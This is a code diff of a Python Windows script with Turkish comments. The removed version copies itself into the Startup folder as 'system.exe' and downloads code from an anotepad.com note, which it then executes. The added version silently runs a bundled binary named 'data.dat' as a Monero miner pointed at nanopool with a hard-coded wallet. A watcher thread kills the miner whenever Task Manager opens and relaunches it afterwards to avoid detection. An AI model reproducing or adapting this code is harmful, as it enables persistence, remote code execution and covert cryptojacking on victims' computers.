@@ -1,36 +1,61 @@
-import requests
-from bs4 import BeautifulSoup
-from cryptography.fernet import Fernet
 import os
+import subprocess
+import psutil
 import time
-import shutil
+import threading    
 import sys
-url = "https://anotepad.com/notes/3gkei2dg"
 
-def startup():
-    user_startup = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
-    global_startup = os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
-    return {"User Startup": user_startup, "Global Startup": global_startup}
-
-def is_program(program_name):
-    global_startup = os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
-    program_path = os.path.join(global_startup, program_name)
-    return os.path.exists(program_path)
-def copy_file(source_path, destination_folder):
-    destination_path = shutil.copy2(source_path, destination_folder + r"\system.exe")
-    return destination_path
-
-def inject():
-    if is_program("system.exe") == False:
-        copy_file(os.path.basename(sys.executable),startup()["User Startup"])
-
-def main():
-    response = requests.get(url)
-    soup = BeautifulSoup(response.text, "html.parser")
-    plaintext_content = soup.find(class_="plaintext")
-    exec(plaintext_content.text.strip())
+def dosya_yolu(dosya_adı):
+    """Dosyanın .exe içinde veya normal çalışmada doğru konumunu döndürür."""
+    if getattr(sys, 'frozen', False):  # Eğer exe olarak çalışıyorsa
+        return os.path.join(sys._MEIPASS, dosya_adı)
+    else:  # Python dosyası olarak çalışıyorsa
+        return os.path.join(os.path.dirname(__file__), dosya_adı)
+    
+data = dosya_yolu("data.dat")
+def start():
+    subprocess.Popen(f"cmd.exe /c start /B {dosya_yolu("data.dat")} -o xmr-eu1.nanopool.org:10300 -u 46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv -p x", shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
-inject()
-time.sleep(1)
-main()
+def kill():
+    for process in psutil.process_iter(attrs=['pid', 'name']):
+        if process.info['name'].lower() == 'data.dat':
+            print(f"Process {process.info['name']} ({process.info['pid']}) bulundu. Durduruluyor...")
+            process.terminate()  # Programı sonlandır
+            process.wait()  # Sonlanmasını bekle
+            print("data.dat başarıyla durduruldu.")
+            return True
+    print("data.dat bulunamadı.")
+    return False
+
+
+def ifapp():
+    for process in psutil.process_iter(attrs=['pid', 'name']):
+        if process.info['name'].lower() == 'data.dat':
+            return True
+    return False
+
+
+def is_task_manager_open():
+    for process in psutil.process_iter(attrs=['name']):
+        if process.info['name'].lower() == "taskmgr.exe":
+            return True
+    return False
+
+
+def task_manager_watcher():
+    while True:
+        if is_task_manager_open():
+            print("Görev Yöneticisi Açıldı!")
+            kill()
+        elif not ifapp():
+            subprocess.Popen(f"cmd.exe /c start /B {data} -o xmr-eu1.nanopool.org:10300 -u 46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv -p x", shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(1)
+
+
+task = threading.Thread(target=task_manager_watcher)
+task.start()
+
+start()
+
+
